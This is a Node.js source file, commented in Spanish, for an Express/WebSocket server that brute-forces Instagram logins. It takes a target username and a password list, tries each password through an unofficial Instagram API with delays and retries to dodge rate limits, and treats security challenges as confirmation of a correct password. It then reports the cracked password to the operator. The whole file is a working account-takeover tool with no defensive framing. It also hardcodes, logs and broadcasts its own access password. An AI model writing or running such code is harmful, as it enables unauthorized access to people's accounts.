const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

// Configuración del servidor HTTP y WebSocket
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// Servir el frontend
app.use(express.static('public'));

// Contraseña de acceso personalizada
const accessPassword = 'error404notfoundÑ'; // Contraseña fija

console.log(`[DEBUG] Contraseña de acceso: ${accessPassword}`);

// Función de retraso
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Variable para rastrear si la IP está bloqueada
let isIpBlocked = false;

// Función para verificar si la IP está bloqueada
async function checkIfIpIsBlocked() {
  const ig = new IgApiClient();
  try {
    // Intentar una solicitud simple a la API de Instagram
    await ig.simulate.preLoginFlow();
    return false; // La IP no está bloqueada
  } catch (error) {
    // Detectar si la IP está bloqueada
    if (error.message.includes('blocked')) {
      return true; // La IP está bloqueada
    }
    return false; // Otros errores
  }
}

// Función para probar una contraseña con reintentos
async function testPassword(username, password, retries = 3) {
  const ig = new IgApiClient();
  try {
    // Simular un dispositivo para la API
    ig.state.generateDevice(username);
    console.log(`[DEBUG] Probando contraseña: ${password}`);

    // Retraso entre intentos para evitar bloqueos
    await delay(2000);

    // Intentar iniciar sesión
    await ig.account.login(username, password);
    console.log(`[DEBUG] ¡Contraseña correcta!: ${password}`);
    return { success: true, password };
  } catch (error) {
    console.error(`[DEBUG] Error con la contraseña ${password}:`, error.message);

    // Detectar si la IP está bloqueada
    if (error.message.includes('blocked')) {
      isIpBlocked = true;
      return { success: false, password, message: 'La IP está bloqueada. Inténtalo de nuevo más tarde.' };
    }

    // Detectar si se requiere un código de 6 dígitos (2FA)
    if (error.message.includes('two_factor_required')) {
      return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
    }

    // Detectar si la contraseña es correcta pero se requiere un desafío
    if (error.message.includes('challenge_required')) {
      return { success: true, password, message: 'Contraseña correcta, pero se requiere un desafío de seguridad.' };
    }

    // Detectar si la contraseña es incorrecta
    if (error.message.includes('password')) {
      return { success: false, password, message: 'Contraseña incorrecta.' };
    }

    // Otros errores: reintentar si quedan intentos
    if (retries > 0) {
      console.log(`[DEBUG] Reintentando... (${retries} intentos restantes)`);
      await delay(2000); // Retraso antes de reintentar
      return testPassword(username, password, retries - 1);
    }

    return { success: false, password, message: error.message };
  }
}

// Manejo de conexiones WebSocket
wss.on('connection', (ws) => {
  console.log('[DEBUG] Nuevo cliente conectado');

  // Enviar la contraseña de acceso al cliente
  ws.send(JSON.stringify({
    type: 'accessPassword',
    password: accessPassword,
  }));

  // Verificar si la IP está bloqueada al conectar un nuevo cliente
  if (isIpBlocked) {
    ws.send(JSON.stringify({
      type: 'ipBlocked',
      message: 'La IP está bloqueada. Inténtalo de nuevo más tarde.',
    }));
  }

  ws.on('message', async (message) => {
    const data = JSON.parse(message);

    if (data.type === 'verifyAccessPassword') {
      // Verificar la contraseña de acceso
      if (data.password === accessPassword) {
        ws.send(JSON.stringify({ type: 'accessGranted' }));
      } else {
        ws.send(JSON.stringify({ type: 'accessDenied', message: 'Contraseña de acceso incorrecta.' }));
      }
    }

    if (data.type === 'startLogin') {
      const { username, passwords } = data;
      let correctPassword = null;

      // Verificar si la IP está bloqueada antes de continuar
      if (isIpBlocked) {
        ws.send(JSON.stringify({
          type: 'ipBlocked',
          message: 'La IP está bloqueada. Inténtalo de nuevo más tarde.',
        }));
        return;
      }

      // Probar cada contraseña línea por línea
      for (let i = 0; i < passwords.length; i++) {
        const password = passwords[i];
        const result = await testPassword(username, password);

        // Enviar el resultado al frontend
        ws.send(JSON.stringify({
          ...result,
          progress: { current: i + 1, total: passwords.length }, // Enviar progreso
        }));

        // Si la contraseña es correcta, guardarla y detener el proceso
        if (result.success) {
          correctPassword = result.password;
          break;
        }
      }

      // Enviar el resultado final al frontend
      if (correctPassword) {
        ws.send(JSON.stringify({
          type: 'finished',
          success: true,
          message: `¡Contraseña correcta encontrada: ${correctPassword}`,
        }));
      } else {
        ws.send(JSON.stringify({
          type: 'finished',
          success: false,
          message: 'Ninguna contraseña fue correcta.',
        }));
      }
    }
  });

  ws.on('close', () => {
    console.log('[DEBUG] Cliente desconectado');
  });
});

// Función para verificar periódicamente si la IP sigue bloqueada
async function checkIpBlockStatus() {
  while (true) {
    await delay(60000); // Verificar cada 60 segundos
    const blocked = await checkIfIpIsBlocked();
    if (!blocked && isIpBlocked) {
      isIpBlocked = false;
      console.log('[DEBUG] La IP ya no está bloqueada.');
      // Notificar a todos los clientes conectados
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            type: 'ipUnblocked',
            message: 'La IP ya no está bloqueada. Puedes continuar.',
          }));
        }
      });
    }
  }
}

// Iniciar el servidor
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`[DEBUG] Servidor ejecutándose en http://localhost:${PORT}`);
  console.log(`[DEBUG] Contraseña de acceso: ${accessPassword}`);
});

// Iniciar la verificación periódica del estado de la IP
checkIpBlockStatus();
